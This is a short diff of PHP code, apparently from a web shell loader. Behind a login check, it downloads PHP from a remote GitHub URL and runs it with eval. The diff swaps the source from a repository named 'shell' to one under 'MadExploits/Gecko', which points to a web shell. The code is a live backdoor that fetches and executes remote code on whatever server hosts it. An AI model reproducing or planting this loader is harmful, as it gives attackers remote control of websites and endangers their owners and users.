@@ -33,7 +33,7 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/mesumx10/shell/main/gecko.php');
+    $a = geturlsinfo('https://github.com/MadExploits/Gecko/raw/main/gecko-new.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
